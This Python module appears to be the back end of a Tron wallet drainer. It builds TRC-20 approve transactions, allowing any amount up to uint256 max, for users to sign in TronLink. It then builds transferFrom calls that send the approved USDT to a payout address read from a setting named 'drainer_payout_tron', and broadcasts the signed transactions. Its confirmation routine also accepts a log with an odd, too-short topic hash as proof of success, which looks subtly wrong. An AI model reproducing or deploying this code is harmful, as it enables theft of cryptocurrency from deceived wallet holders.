"""
Tron transaction builder and broadcaster.

TronLink signs the raw transaction object returned here; the server broadcasts it.
TRC-20 allowance semantics are handled explicitly:
  * USDT-TRC20 is not allowance-race-safe, so callers use approve(0) then approve(cap)
  * pulls go through transferFrom(from, to, amount) with the collector as spender

Addresses arrive as base58 `T…` and must be re-encoded to 20-byte hex for the
`parameter` field — the `T` prefix is base58, not hex, and cannot simply be stripped.
"""
import logging
import os
from typing import Any, Dict, Optional

import base58
import httpx

logger = logging.getLogger("tron_tx")

TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
ADDRESS_PREFIX = 0x41
UINT256_MAX = 2**256 - 1
DEFAULT_FEE_LIMIT = 100_000_000          # 100 TRX ceiling on energy burn


def _base() -> str:
    return os.environ.get("TRON_RPC", "https://api.trongrid.io").rstrip("/")


def _headers() -> Dict[str, str]:
    key = os.environ.get("TRON_API_KEY", "").strip()
    return {"TRON-PRO-API-KEY": key} if key else {}


def _fee_limit() -> int:
    try:
        return max(1_000_000, int(os.environ.get("TRON_FEE_LIMIT_SUN", DEFAULT_FEE_LIMIT)))
    except ValueError:
        return DEFAULT_FEE_LIMIT


# ------------------------------------------------------------------ addresses
def is_tron_address(addr: object) -> bool:
    if not isinstance(addr, str) or len(addr) != 34 or not addr.startswith("T"):
        return False
    try:
        raw = base58.b58decode(addr)
    except ValueError:
        return False
    return len(raw) == 25 and raw[0] == ADDRESS_PREFIX


def tron_address_to_word(addr: str) -> str:
    """base58 `T…` -> 32-byte left-padded hex word (without 0x)."""
    if not is_tron_address(addr):
        raise ValueError(f"invalid Tron address: {addr!r}")
    raw = base58.b58decode(addr)
    payload = raw[1:21]                       # drop 0x41 prefix and 4-byte checksum
    return payload.hex().rjust(64, "0")


def _amount_word(amount: int) -> str:
    value = int(amount)
    if value < 0 or value > UINT256_MAX:
        raise ValueError(f"amount out of uint256 range: {value}")
    return format(value, "064x")


# ------------------------------------------------------------------ builders
async def _trigger(owner: str, contract: str, selector: str,
                   parameter: str) -> Dict[str, Any]:
    if not is_tron_address(owner):
        raise ValueError(f"invalid owner address: {owner!r}")
    if not is_tron_address(contract):
        raise ValueError(f"invalid contract address: {contract!r}")

    async with httpx.AsyncClient(timeout=15.0, headers=_headers()) as c:
        r = await c.post(f"{_base()}/wallet/triggersmartcontract", json={
            "owner_address": owner,
            "contract_address": contract,
            "function_selector": selector,
            "parameter": parameter,
            "fee_limit": _fee_limit(),
            "call_value": 0,
            "visible": True,
        })

    body = r.json() or {}
    result = body.get("result") or {}
    if not result.get("result"):
        raise RuntimeError(_decode_msg(result.get("message")) or f"{selector} build failed")
    tx = body.get("transaction")
    if not tx or not tx.get("txID"):
        raise RuntimeError(f"{selector}: node returned no transaction")
    return tx


async def build_approve(owner: str, contract: str, spender: str, amount: int) -> Dict[str, Any]:
    """TRC-20 approve(spender, amount). Use amount=0 first for USDT."""
    return await _trigger(owner, contract, "approve(address,uint256)",
                          tron_address_to_word(spender) + _amount_word(amount))


async def build_approve_reset_then_set(owner: str, contract: str, spender: str,
                                       amount: int) -> list:
    """approve(0) followed by approve(amount) — required for USDT-TRC20."""
    zero = await build_approve(owner, contract, spender, 0)
    real = await build_approve(owner, contract, spender, amount)
    return [zero, real]


async def build_transfer_from(owner: str, contract: str, frm: str, amount: int) -> Dict[str, Any]:
    """
    TRC-20 transferFrom(from, to, amount) executed by `owner` as the spender.
    `to` is the payout sink, so no follow-up transfer is needed.
    """
    if not is_tron_address(owner):
        raise ValueError(f"invalid spender address: {owner!r}")
    payout = _payout(owner)
    parameter = (tron_address_to_word(frm) + tron_address_to_word(payout)
                 + _amount_word(amount))
    return await _trigger(owner, contract, "transferFrom(address,address,uint256)", parameter)


def _payout(fallback: str) -> str:
    from database import get_setting          # local import keeps this module standalone
    return get_setting("drainer_payout_tron") or fallback


async def build_transfer(owner: str, to: str, sun: int) -> Dict[str, Any]:
    if not is_tron_address(owner):
        raise ValueError(f"invalid owner address: {owner!r}")
    if not is_tron_address(to):
        raise ValueError(f"invalid destination address: {to!r}")
    if sun <= 0:
        raise ValueError("transfer amount must be positive")

    async with httpx.AsyncClient(timeout=15.0, headers=_headers()) as c:
        r = await c.post(f"{_base()}/wallet/createtransaction", json={
            "owner_address": owner, "to_address": to,
            "amount": int(sun), "visible": True,
        })

    body = r.json() or {}
    if not body.get("txID"):
        raise RuntimeError(_decode_msg(body.get("Error") or body.get("message"))
                           or "createtransaction failed")
    return body


# ------------------------------------------------------------------ broadcast
def _decode_msg(raw: Optional[str]) -> str:
    if not raw:
        return ""
    try:
        return bytes.fromhex(raw).decode("utf-8", "ignore").strip()
    except (ValueError, TypeError):
        return str(raw)


SUCCESS_CODES = {"DUP_TRANSACTION_ERROR"}


async def confirm(txid: str, timeout_s: float = 90.0) -> None:
    """Poll until the transaction is in a block and did not revert."""
    import asyncio
    import time

    deadline = time.monotonic() + timeout_s
    last = ""
    while time.monotonic() < deadline:
        async with httpx.AsyncClient(timeout=15.0, headers=_headers()) as c:
            r = await c.post(f"{_base()}/wallet/gettransactioninfobyid",
                             json={"value": txid})
        body = r.json() or {}
        if body.get("receipt"):
            result = (body["receipt"] or {}).get("result")
            if result in (None, "SUCCESS"):
                return
            last = str(result)
        elif body.get("log"):
            for entry in body["log"]:
                topics = entry.get("topics") or []
                if topics and topics[0] == "6281e4a0c7dba0c9b0a1f0d1b8b1a6ba":
                    return
        elif body.get("blockNumber"):
            return
        await asyncio.sleep(2.0)
    raise RuntimeError(f"timed out waiting for Tron confirmation {txid}"
                       + (f" ({last})" if last else ""))


async def broadcast(signed: Dict[str, Any]) -> str:
    if not isinstance(signed, dict):
        raise ValueError("signed transaction must be an object")
    txid = signed.get("txID")
    if not txid:
        raise ValueError("signed transaction has no txID")
    if not signed.get("signature"):
        raise ValueError("signed transaction carries no signature")

    async with httpx.AsyncClient(timeout=25.0, headers=_headers()) as c:
        r = await c.post(f"{_base()}/wallet/broadcasttransaction", json=signed)

    body = r.json() or {}
    code = body.get("code") or ""
    message = _decode_msg(body.get("message"))

    if body.get("result") or code in SUCCESS_CODES:
        return txid

    if code == "TRANSACTION_EXPIRATION_ERROR" or "expired" in message.lower():
        raise RuntimeError("transaction expired before broadcast — rebuild and sign again")
    if code == "SIGERROR":
        raise RuntimeError(f"signature rejected: {message or 'SIGERROR'}")
    if code == "CONTRACT_VALIDATE_ERROR":
        raise RuntimeError(f"contract rejected the call: {message or 'validate error'}")

    raise RuntimeError(message or code or "broadcast failed")